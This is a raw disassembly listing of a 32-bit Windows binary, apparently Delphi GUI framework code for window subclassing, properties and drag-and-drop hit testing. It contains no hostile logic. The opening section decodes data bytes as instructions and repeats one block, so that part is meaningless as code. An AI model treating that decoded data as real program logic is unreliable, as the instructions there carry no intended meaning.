add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax + 0x3000437a ] dl
mov [ ebx ] al
sbb al 0x82
inc ebx
add [ eax ] bl
test [ ebx ] eax
dec eax
add [ ebx ] 0xffffffc8
mov [ ebx ] al
int3
jo r-xdata
inc ecx
add [ esp + ebp * 2 + 0x43 ] ah
add [ eax + eax * 2 + 0x73840043 ] al
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
add [ ebx + esi - 0x70f7ffc0 ] al
inc ebx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x4c ] bl
inc ebx
add [ eax - 0x4f ] dh
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
add [ eax ] al
add [ eax ] al
jo r-xdata
add bh bh
[ eax + 0x430c ]
add al ah
jno r-xdata
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ ebp + ecx * 4 + 0x6ee40043 ] ah
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add ah bh
jae r-xdata
add [ eax ] al
or [ esi ] al
inc ebx
add al ah
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ edx + 0x200430d ] cl
adc [ ebx ] al
add al 0x2
inc ebx
add [ eax + edx ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_430c61
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xd ] dh
inc ebx
add [ eax + edx ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x200430d ] cl
adc [ ebx ] al
add al 0x2
add [ eax ] al
or [ esi ] al
inc ebx
add al ah
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
inc ebx
add [ esi + edi * 4 + 0x43 ] ah
add al dl
xchg [ ebx ] al
je r-xdata
sub [ ebx + eax * 2 ] cl
add [ ecx + eax ] bh
add al bh
or al [ ebx ]
mov [ ecx ] al
add [ eax ] al
imul eax [ eax ] 0x111000f
dec esi
add [ 0x15011400 ] dl
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax + 0x3000437a ] dl
mov [ ebx ] al
sbb al 0x82
inc ebx
add [ eax ] bl
test [ ebx ] eax
dec eax
add [ ebx ] 0xffffffc8
mov [ ebx ] al
int3
jo r-xdata
inc ecx
add [ esp + ebp * 2 + 0x43 ] ah
add [ eax + eax * 2 + 0x73840043 ] al
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0x70bc0041 0x43
js r-xdata
add al ah
jno r-xdata
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ ebp + ecx * 4 + 0x6ee40043 ] ah
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add ah bh
jae r-xdata
add [ ebx + esi - 0x70f7ffc0 ] al
inc ebx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x4c ] bl
inc ebx
add [ eax - 0x4f ] dh
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
sub_4313a9
mov [ ebx ] al
test [ edi - 0x78d3ffbd ] al
inc ebx
add [ ebx + esi * 4 - 0x2f3fffbd ] ah
inc ebx
add [ ebp + eax * 8 + 0x43 ] dl
add [ eax ] ah
mov al 0x43
add [ eax ] dl
mov bl 0x43
add [ eax ] bl
enter 0x43 0x30
int3
sub_431954
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_431a0c
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_431a40
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404338
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_431a0c
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_431a9c
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_431c80
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40bf68
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404398
mov eax edi
mov edx esi
call sub_403ecc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_431cc4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40bf68
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404398
mov eax edi
mov edx esi
call sub_403ecc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_431d08
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_435d5c
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_431d84
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov eax ebx
call sub_43b390
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_431e30
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4138b8
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_431e64
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43b390
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_431e8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_431e64
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_431e30
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41375c
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_413934
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_431ee8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_413790
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4138b8
mov edx 0x8
call sub_4026dc
inc esi
dec ebx
jne r-xdata
sub_431f1c
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4138b8
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_431e30
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_431f80
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_431fe0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403078
mov edx esp
mov eax esi
call sub_4040dc
add esp 0x100
pop esi
pop ebx
retn
sub_43201c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4320e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_43313c
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_432ac4
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406878
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_432ac4
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_43313c
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_432ac4
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_43313c
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_4320eb
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_455598
call sub_403930
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_43313c
sub_432144
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43216e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4321d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_431f80
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_432200
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403324
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_43222c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403324
xor edx edx
sub_432284
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_43cfb4
sub_4322a4
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_43cf9c
sub_4322c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4321b0
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cba0
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_4231a8
mov edx eax
mov eax esi
call sub_41cd1c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_43232c
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_43235c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4321d4
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4323b8
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403324
pop edi
pop esi
pop ebp
retn 0x4
sub_4323dc
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_432400
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4323dc
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4323dc
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4324bc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_432528
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_432978
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_431a40
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_43b390
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_43b390
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_43b390
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403324
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_4324bc
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_43b390
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_43b390
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_4326c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_43b390
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_43b390
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_432704
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_431f1c
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_432528
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4138b8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_43b390
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_4326c0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403324
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_439ec0
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_431e8c
sub_432860
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_413914
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_4137a8
mov edx edi
mov eax [ rw-data ]
call sub_41375c
jmp r-xdata
sub_4328c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_432918
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404338
push eax
call GlobalFindAtomA
